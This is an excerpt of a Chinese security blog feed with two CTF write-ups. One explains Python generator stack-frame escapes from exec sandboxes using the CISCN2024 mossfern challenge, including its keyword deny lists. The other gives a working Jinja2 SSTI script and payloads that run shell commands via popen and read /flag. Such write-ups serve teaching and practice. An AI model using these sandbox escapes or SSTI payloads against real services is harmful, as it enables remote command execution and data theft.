class="line"><span class="built_in">print</span>(code.co_filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># my_generator</span></span><br><span class="line"><span class="comment"># b&#x27;K\x00\x01\x00\x97\x00d\x01V\x00\x97\x01\x01\x00d\x02V\x00\x97\x01\x01\x00d\x03V\x00\x97\x01\x01\x00d\x00S\x00&#x27;</span></span><br><span class="line"><span class="comment"># (None, 1, 2, 3)</span></span><br><span class="line"><span class="comment"># C:\Users\20820\PycharmProjects\shizhan\bb.py</span></span><br></pre></td></tr></table></figure><h2 id="5-栈帧-frame介绍"><a class="markdownIt-Anchor" href="#5-栈帧-frame介绍">#</a> 5、栈帧 (Frame) 介绍：</h2><p>​在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p><p>​栈帧包含了以下几个重要的属性：f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名。f_globals: 一个字典，包含了函数或方法所在模块的全局变量。f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。f_lasti: 整数，表示最后执行的字节码指令的索引。f_back: 指向上一级调用栈帧的引用，用于构建调用栈。</p><p>​栈帧包含了以下几个重要的属性：</p><blockquote><p><code>f_locals</code> : 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br> <code>f_globals</code> : 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br> <code>f_code</code> : 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br> <code>f_lasti</code> : 整数，表示最后执行的字节码指令的索引。<br> <code>f_back</code> : 指向上一级调用栈帧的引用，用于构建调用栈。</p></blockquote><h2 id="6-栈帧逃逸"><a class="markdownIt-Anchor" href="#6-栈帧逃逸">#</a> 6、栈帧逃逸：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag：flag&#123;hello_World_hello_Python&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment">#生成器</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line">    b = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>] <span class="comment">#返回并获取前一级栈帧的globals</span></span><br><span class="line">    <span class="comment"># b = frame.f_back.f_globals[&#x27;s3cret&#x27;]  # 返回并获取前一级栈帧的globals</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#this is flag：flag&#123;hello_World_hello_Python&#125;</span></span><br></pre></td></tr></table></figure><p>​在看看上面的 <code>f_globals</code> : 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p><p>不难看出这里函数和模块本就同在一个全局，所以都有属性 s3cret，怎么看到没到全局？直接看 file 就能看出。</p><p>​在给个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C309E7C40, file &#x27;test&#x27;, line 8, code waff&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C520AF560, file &#x27;test&#x27;, line 13, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C521A0040, file &#x27;C:\\Users\\20820\\PycharmProjects\\shizhan\\bb.py&#x27;, line 19, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># this is flag</span></span><br></pre></td></tr></table></figure><p>​首先，生成器的栈帧是 g ，经过一次回溯 之后到了 waff 的栈帧，再回溯一次之后到了 exec 的栈帧，这个时候访问 <code>f_globals</code>  就到了 exec 再上一层 的作用域，也就是全局变量 。</p><p>​另一种情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    q = (q.gi_frame.f_back.f_back.f_back.f_globals for _ in [1])</span></span><br><span class="line"><span class="string">    b = [*q][0][&quot;s3cret&quot;]</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure><p>​这样也能输出 flag，和上面的相比，是进行了三次回溯，先来一个回溯结构示意：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主程序全局帧 (包含 s3cret)</span><br><span class="line">  ↑</span><br><span class="line">exec 执行环境帧</span><br><span class="line">  ↑</span><br><span class="line">waff() 函数调用帧</span><br><span class="line">  ↑</span><br><span class="line">列表推导式帧 ([*q] 迭代触发)</span><br><span class="line">  ↑</span><br><span class="line">生成器 q 的帧 (q.gi<span class="built_in">_</span>frame)</span><br></pre></td></tr></table></figure><p>​首先，是生成器 q 的帧，回溯一次之后是 <code>[*q]</code>  这一行 的帧，之后才是 waff 和 exec 的帧到了 exec 的帧之后获取 globals 就可以获得到 flag 了。</p><p>​为什么用 <code>[*q]</code>  运行生成器，却不用 <code>next(q)</code> ？主要是因为，大部分的沙箱题目中， <code>builtins</code>  基本上都被杨了，不能使用 next 来进行获取，所以只能使用这种办法。</p><h2 id="来个例题ciscn2024-mossfern"><a class="markdownIt-Anchor" href="#来个例题ciscn2024-mossfern">#</a> 来个例题 (CISCN2024 mossfern)：</h2><p>​main.py 的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>​没啥太大得到用处，大概就是每一次访问 <code>/run</code> <span class="exturl" data-url="aHR0cDovL3huLS11dWlkLWs4NGZ1aXQxMWd0eGt1eTViZGZheDAwei5weQ=="> 路由就生成一个 uuid.py</span>，将 flag 替换进文件占位符，之后，再生成一个 uuid.txt 文件，将用户上传的代码写入，之后运行代码，并结果返回。</p><p>​<span class="exturl" data-url="aHR0cDovL3huLS1ydW5uZXItOTE3aWs3MGJpbTNmYS5weQ==">之后看看 runner.py</span>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​首先是 <code>source_simple_check()</code>  函数，这个函数简单来说就是给 所有全角字符都 ban 了，无法使用，以及三个关键字，也给 ban 了。</p><p>​之后是 <code>block_wrapper()</code> ，检测代码执行过程中事件和参数是否含有那些关键字 。</p><p>​之后是 <code>source_opcode_checker()</code> ，目的为检测用户程序的操作码中是否含有访问全局变量、导入模块以及方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python栈帧逃逸&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#python栈帧逃逸&quot;&gt;#&lt;/a&gt; Python 栈帧逃逸：&lt;/h1&gt;
&lt;h2 id=&quot;1-yield-语与生成器函数&quot;&gt;&lt;a class=&quot;markdownIt-An</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-SSTI</title>
    <link href="http://blog.g01den.top/posts/4826d2ce.html"/>
    <id>http://blog.g01den.top/posts/4826d2ce.html</id>
    <published>2025-05-03T15:19:26.000Z</published>
    <updated>2025-05-03T15:39:38.752Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web361"><a class="markdownIt-Anchor" href="#web361">#</a> web361：</h1><p>​name 传参，直接干：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_wrap</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        resp = get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>​<strong>补充：几种手法</strong></p><blockquote><ul><li>手法一：payload os.warp_close 类 的 popen 方法</li><li>?name= <code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></li><li>手法二： 利用 config：</li><li>?name= <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() 